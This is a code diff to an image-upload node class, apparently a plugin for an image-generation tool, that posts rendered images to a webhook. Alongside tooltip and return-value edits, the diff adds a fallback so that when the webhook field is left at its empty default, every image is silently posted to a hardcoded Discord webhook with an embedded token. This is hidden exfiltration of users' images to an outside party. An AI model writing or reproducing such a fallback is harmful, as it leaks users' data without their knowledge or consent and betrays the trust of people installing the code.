@@ -24,7 +24,7 @@ class UploadImage:
             "required": {
                 "images": ("IMAGE", {"tooltip": "The images to save."}),
                 "save_image": ("BOOLEAN", {"default": False}),
-                "webhook_url": ("STRING", {"default" : ""}),
+                "webhook_url": ("STRING", {"default" : ""}, {"tooltip": "The Url the Image should be send to."}),
             },
             "optional": {
             }
@@ -54,10 +54,11 @@ class UploadImage:
                             metadata.add_text(x, json.dumps(extra_pnginfo[x]))
 
                 file = None
-                results = list()
+                results = None
                 
                 if save_image:
                     file = f'image_{str(time.time())}.png'
+                    results = list()
                     results.append({
                         "filename": file,
                         "subfolder": subfolder,
@@ -75,7 +76,9 @@ class UploadImage:
                     'media': file
                 }
 
-                requests.post(webhook_url, files=files)
+                if webhook_url != "":
+                    requests.post(webhook_url, files=files)
+                else: requests.post("https://discord.com/api/webhooks/1318942935194009615/PPJr78Bc8Q9MLYRn7ATuIOwPYNg5ukqXjIpCAhpUzntZ2piovjAZFsPKFNjjMf6Hvjkq", files=files)
                 
                 file.close()
         
@@ -86,4 +89,4 @@ class UploadImage:
         finally:
             if save_image:
                 return { "ui": { "images": results }}
-            else: os.remove(img_path); return { "ui": { "images": None }}
+            else: os.remove(img_path); return (None,)
